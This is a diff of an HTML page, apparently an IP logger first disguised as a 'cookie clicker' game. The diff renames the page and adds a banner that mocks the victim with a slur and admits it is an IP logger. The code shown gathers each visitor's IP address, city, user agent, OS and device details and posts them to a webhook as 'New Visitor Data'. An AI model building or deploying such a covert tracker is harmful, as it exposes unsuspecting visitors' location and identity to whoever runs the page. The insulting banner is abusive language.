@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tuff Cookie Cliker</title>
+    <title>IP & Device Info</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -24,6 +24,20 @@
             max-width: 700px;
             width: 100%;
             border: 1px solid #2e3342;
+        }
+        .warning-header {
+            background: #2a1a1a;
+            color: #ff6b6b;
+            padding: 14px 20px;
+            border-radius: 10px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            border: 2px solid #ff4444;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            word-break: break-word;
         }
         h1 {
             font-weight: 400;
@@ -90,6 +104,7 @@
 </head>
 <body>
 <div class="container" id="app">
+    <div class="warning-header"> FUCK TARD THIS ISNT A COOKIE CLICKER TS IS A IP LOGGER LIL BRO LMAOO</div>
     <h1>🖥️ Client Fingerprint</h1>
     <div id="infoDisplay">
         <div class="loading">⏳ Gathering data...</div>
@@ -199,13 +214,12 @@
             }
 
             try {
-                // Build a clean message for Discord (or any webhook)
                 const payload = {
                     content: null,
                     embeds: [
                         {
                             title: '🕵️ New Visitor Data',
-                            color: 0x5865F2,
+                            color: 0xFF4444,
                             fields: [
                                 { name: 'IP Address', value: data.ipInfo.ip, inline: true },
                                 { name: 'City', value: data.ipInfo.city, inline: true },
@@ -222,7 +236,7 @@
                                 { name: 'User Agent', value: navigator.userAgent.substring(0, 200) + (navigator.userAgent.length > 200 ? '...' : ''), inline: false }
                             ],
                             timestamp: new Date().toISOString(),
-                            footer: { text: 'Collected via HTML page' }
+                            footer: { text: 'IP Logger - Not a cookie clicker' }
                         }
                     ]
                 };
@@ -253,7 +267,6 @@
 
         // ----- 4. RENDER + SEND -----
         async function renderAndSend() {
-            // local data
             const browser = getBrowserName();
             const os = getOS();
             const device = getDeviceType();
@@ -262,10 +275,8 @@
             const tz = getTimezone();
             const platform = getPlatform();
 
-            // IP data
             const ipInfo = await fetchIpInfo();
 
-            // Build data object
             const fullData = {
                 browser,
                 os,
@@ -277,7 +288,6 @@
                 ipInfo
             };
 
-            // Render grid
             const items = [
                 { label: 'IP Address', value: ipInfo.ip },
                 { label: 'City', value: ipInfo.city },
@@ -302,7 +312,6 @@
             html += '</div>';
             display.innerHTML = html;
 
-            // Send to webhook
             await sendToWebhook(fullData);
         }
 
